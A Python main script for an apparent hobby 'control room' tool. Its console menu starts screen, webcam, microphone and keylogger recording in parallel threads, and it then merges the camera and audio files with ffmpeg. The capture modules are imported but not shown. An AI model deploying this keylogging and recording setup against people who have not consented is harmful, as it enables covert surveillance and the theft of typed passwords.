# Jai Shree Ram

from utils.screen import start_screen_recording
from utils.cam import start_camera_recording
from utils.keylogger import start_keylogger
from utils.voice import start_voice_recording
import os
import keyboard
import sys
import threading
from datetime import datetime
import winsound
import subprocess


def add_audio_to_video(session_folder):
    # Check if ffmpeg is available
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("\nError: FFmpeg is not installed or not in system PATH!")
        print("Please install FFmpeg and add it to your system PATH")
        return
    
    cam_dir = os.path.join(session_folder, 'camera')
    voice_dir = os.path.join(session_folder, 'voice')
    
    # Verify directories exist
    if not os.path.exists(cam_dir) or not os.path.exists(voice_dir):
        print("\nError: Camera or voice directories not found!")
        return
    
    # Get most recent recordings - updated prefixes
    cam_files = [f for f in os.listdir(cam_dir) if f.startswith('camera_')]
    voice_files = [f for f in os.listdir(voice_dir) if f.startswith('voice_')]
    
    if not cam_files or not voice_files:
        print("\nError: No camera or voice recordings found!")
        print(f"Camera files found: {len(cam_files)}")
        print(f"Voice files found: {len(voice_files)}")
        return
        
    cam_file = os.path.join(cam_dir, sorted(cam_files)[-1])  # Get latest
    voice_file = os.path.join(voice_dir, sorted(voice_files)[-1])  # Get latest
    
    # Verify files exist and are not empty
    if not os.path.exists(cam_file) or os.path.getsize(cam_file) == 0:
        print(f"\nError: Camera file is missing or empty: {cam_file}")
        return
    if not os.path.exists(voice_file) or os.path.getsize(voice_file) == 0:
        print(f"\nError: Voice file is missing or empty: {voice_file}")
        return
    
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
    output_file = os.path.join(session_folder, 'final', f'final_{timestamp}.mp4')
    
    # Use subprocess to run ffmpeg with proper error handling
    try:
        # First convert audio to compatible format
        temp_audio = os.path.join(voice_dir, 'temp_audio.wav')
        audio_cmd = [
            'ffmpeg',
            '-i', voice_file,
            '-acodec', 'pcm_s16le',
            '-ar', '44100',
            temp_audio,
            '-y'
        ]
        subprocess.run(audio_cmd, check=True, capture_output=True)
        
        # Then merge video and converted audio
        merge_cmd = [
            'ffmpeg',
            '-i', cam_file,
            '-i', temp_audio,
            '-c:v', 'copy',
            '-c:a', 'aac',
            '-shortest',
            output_file,
            '-y'
        ]
        subprocess.run(merge_cmd, check=True, capture_output=True)
        
        # Verify the output file exists
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(f"\nSuccessfully added audio to video: {output_file}")
            
            # Only cleanup if merge was successful
            os.remove(cam_file)
            os.remove(voice_file)
            os.remove(temp_audio)
            print("Original files cleaned up")
        else:
            print("\nError: Output file was not created successfully")
            
    except subprocess.CalledProcessError as e:
        print(f"\nFFmpeg Error: {e.stderr.decode()}")
    except Exception as e:
        print(f"\nError: {str(e)}")

def start_all_recordings():
    # Create session folder
    timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
    session_folder = os.path.join('data', f'session_{timestamp}')
    
    # Create session directory and subdirectories
    for subfolder in ['screen', 'camera', 'voice', 'final', 'keylog']:
        os.makedirs(os.path.join(session_folder, subfolder), exist_ok=True)
    
    stop_events = {}
    
    # Create threads for each recording function
    screen_thread = threading.Thread(target=lambda: globals().update(
        {'stop_screen': start_screen_recording(session_folder)}))
    cam_thread = threading.Thread(target=lambda: globals().update(
        {'stop_cam': start_camera_recording(session_folder)}))
    voice_thread = threading.Thread(target=lambda: globals().update(
        {'stop_voice': start_voice_recording(session_folder)}))
    keylogger_thread = threading.Thread(target=lambda: globals().update(
        {'stop_keylogger': start_keylogger(session_folder)}))
    
    # Start all threads simultaneously
    threads = [screen_thread, cam_thread, voice_thread, keylogger_thread]
    for thread in threads:
        thread.daemon = True  # Make threads daemon so they exit when main thread exits
        thread.start()
    
    # Wait for all threads to complete initialization
    for thread in threads:
        thread.join(timeout=5)  # Add timeout to prevent hanging
    
    print(f"\nAll recordings started in session: {session_folder}")
    print("Press ESC to stop...")
    keyboard.wait('esc', suppress=True)
    
    # Stop all recordings with timeout
    stop_funcs = ['stop_screen', 'stop_cam', 'stop_voice', 'stop_keylogger']
    for func in stop_funcs:
        try:
            if func in globals():
                stop_fn = globals()[func]
                if callable(stop_fn):
                    stop_fn()
                else:
                    print(f"\nWarning: {func} is not callable")
        except Exception as e:
            print(f"\nError stopping {func}: {str(e)}")
    
    # Wait for threads to finish with longer timeout for voice recording
    for thread in threads:
        if not thread.join(timeout=15):  # Increased timeout and check if thread is still alive
            print(f"\nWarning: A recording thread is still running")
            # Force thread termination
            if 'stop_voice' in globals():
                try:
                    globals()['stop_voice']()
                except:
                    pass
        
    print("\nAll recordings stopped!")
    

def view_recorded_data():
    data_dir = 'data'
    if not os.path.exists(data_dir):
        print("\nNo recordings found!")
        return
        
    print("\nRecorded files:")
    os.system("start data")
            
    input("\nPress Enter to continue...")

def merge_recordings():
    data_dir = 'data'
    if not os.path.exists(data_dir):
        print("\nNo sessions found!")
        return

    # List all session folders
    sessions = [d for d in os.listdir(data_dir) if os.path.isdir(os.path.join(data_dir, d)) and d.startswith('session_')]
    
    if not sessions:
        print("\nNo session folders found!")
        return

    print("\nAvailable sessions:")
    for i, session in enumerate(sessions, 1):
        print(f"{i}. {session}")

    try:
        choice = int(input("\nEnter session number to merge: "))
        if 1 <= choice <= len(sessions):
            session_folder = os.path.join(data_dir, sessions[choice-1])
            add_audio_to_video(session_folder)
        else:
            print("\nInvalid session number!")
    except ValueError:
        print("\nPlease enter a valid number!")
    
    input("\nPress Enter to continue...")

def print_control_room_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                     ARPITBHAU's CONTROL ROOM                 ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                                                              ║
    ║  [1] Start All Recordings                                    ║
    ║  [2] View Recorded Data                                      ║
    ║  [3] Merge Camera and Audio                                  ║
    ║  [ESC] Exit                                                  ║
    ║                                                              ║
    ║  All data will be saved in the 'data' directory              ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def play_startup_sound():
    def play_sound():
        try:
            winsound.PlaySound("./assets/iseeu.wav", winsound.SND_FILENAME)
        except:
            print("Failed to play startup sound")  # Continue silently if sound fails to play
            
    sound_thread = threading.Thread(target=play_sound)
    sound_thread.daemon = True
    sound_thread.start()

def main():
    play_startup_sound()

    # Create data directory if it doesn't exist
    if not os.path.exists('data'):
        os.makedirs('data')
        
    while True:
        print_control_room_banner()
        print("Select an option: ")

        try:
            # Wait for a single keypress
            event = keyboard.read_event(suppress=True)
            
            if event.event_type == keyboard.KEY_DOWN:
                if event.name == '1':
                    start_all_recordings()
                elif event.name == '2':
                    view_recorded_data()
                elif event.name == '3':
                    merge_recordings()
                elif event.name == 'esc':
                    print("\nExiting...")
                    sys.exit(0)
                    
            # Clear the screen for next iteration
            os.system('cls' if os.name == 'nt' else 'clear')
            
        except Exception as e:
            print(f"\nAn error occurred: {str(e)}")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()